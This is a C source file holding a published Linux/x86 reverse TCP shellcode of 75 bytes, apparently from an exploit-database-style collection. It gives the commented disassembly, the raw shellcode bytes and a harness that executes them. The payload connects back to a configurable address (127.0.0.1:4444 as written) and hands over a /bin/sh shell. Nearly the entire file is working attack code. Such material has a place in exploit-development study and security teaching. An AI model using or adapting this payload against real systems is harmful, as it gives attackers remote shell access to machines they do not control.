/* 
*  Title:    Shell Reverse TCP Shellcode - 75 bytes
*  Platform: Linux/x86
*  Date:     13 September 2018
*  Author:   Ray Doyle (@doylersec)
*  Website:  http://www.doyler.net
*  
*  Description: The following shellcode executes a reverse TCP connection to 127.0.0.1 on port 4444 and executes /bin/sh. The connection information can be modified in the 'connect' section of the shellcode.
*
*  For more information on this shellcode, please see the following blog post:
*  https://www.doyler.net/security-not-included/shell-reverse-tcp-shellcode
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 66                	push   0x66
 8048062:	58                   	pop    eax
 8048063:	6a 01                	push   0x1
 8048065:	5b                   	pop    ebx
 8048066:	31 f6                	xor    esi,esi
 8048068:	56                   	push   esi
 8048069:	53                   	push   ebx
 804806a:	6a 02                	push   0x2
 804806c:	89 e1                	mov    ecx,esp
 804806e:	cd 80                	int    0x80
 8048070:	5f                   	pop    edi
 8048071:	97                   	xchg   edi,eax

08048072 <connect>:
 8048072:	b3 66                	mov    bl,0x66
 8048074:	93                   	xchg   ebx,eax
 8048075:	68 7f 01 01 01       	push   0x101017f
 804807a:	66 68 11 5c          	pushw  0x5c11
 804807e:	66 53                	push   bx
 8048080:	43                   	inc    ebx
 8048081:	89 e1                	mov    ecx,esp
 8048083:	6a 10                	push   0x10
 8048085:	51                   	push   ecx
 8048086:	57                   	push   edi
 8048087:	89 e1                	mov    ecx,esp
 8048089:	cd 80                	int    0x80
 804808b:	87 df                	xchg   edi,ebx

0804808d <dup>:
 804808d:	6a 02                	push   0x2
 804808f:	59                   	pop    ecx

08048090 <dup_loop>:
 8048090:	b0 3f                	mov    al,0x3f
 8048092:	cd 80                	int    0x80
 8048094:	49                   	dec    ecx
 8048095:	79 f9                	jns    8048090 <dup_loop>

08048097 <execve>:
 8048097:	56                   	push   esi
 8048098:	b0 0b                	mov    al,0xb
 804809a:	68 2f 2f 73 68       	push   0x68732f2f
 804809f:	68 2f 62 69 6e       	push   0x6e69622f
 80480a4:	89 e3                	mov    ebx,esp
 80480a6:	41                   	inc    ecx
 80480a7:	31 d2                	xor    edx,edx
 80480a9:	cd 80                	int    0x80
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\xb3\x66\x93\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x53\x43\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x87\xdf\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x56\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x31\xd2\xcd\x80";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}